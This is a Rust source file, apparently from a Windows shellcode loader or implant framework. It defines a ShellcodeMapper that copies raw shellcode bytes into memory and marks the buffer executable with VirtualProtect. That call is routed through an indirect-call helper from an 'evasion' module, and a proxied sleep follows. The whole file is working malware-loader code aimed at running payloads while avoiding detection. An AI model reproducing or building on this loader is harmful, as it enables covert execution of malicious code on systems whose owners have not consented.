use std::ffi::c_void;
use windows::Win32::{Foundation::GetLastError, System::Memory::VirtualProtect};

use crate::{
    evasion::{one_shot, time::proxied_sleep},
    registers,
};

use super::Mapper;

pub struct ShellcodeMapper {
    allocation: *const c_void,
    len: usize,
}

impl ShellcodeMapper {
    pub fn new(allocation: *const c_void, len: usize) -> Self {
        Self {
            allocation: allocation,
            len: len,
        }
    }
}

impl Mapper for ShellcodeMapper {
    type Error = u32;

    fn map(&mut self, data: &[u8]) -> Result<*const std::ffi::c_void, Self::Error> {
        dprintln!(
            "Copying {} shellcode bytes to {:#x?}",
            data.len(),
            &self.allocation
        );

        unsafe {
            std::ptr::copy_nonoverlapping(data.as_ptr(), self.allocation as *mut u8, data.len());
        }

        dprintln!("Calling VirtualProtect on buffer");
        {
            let mut ret: u32 = 0;
            match one_shot(
                VirtualProtect as *const usize,
                &registers!(
                    self.allocation,
                    self.len as *const usize,
                    // exec
                    0x20u32 as *const u64,
                    &mut ret as *mut _
                ),
                &[],
            ) {
                Ok(_) => {
                    /*
                    if r == 0 {
                        deprintln!(
                            "VirtualProtect call errored out: {:#?}\nGetLastError: {:#?}",
                            r,
                        );

                        return Err(r as u32);
                    }*/
                }
                Err(e) => {
                    dprintln!("Error with one_shot: {:#?}", e);
                    return Err(0);
                }
            }
        }
        proxied_sleep();

        Ok(self.allocation)
    }
}
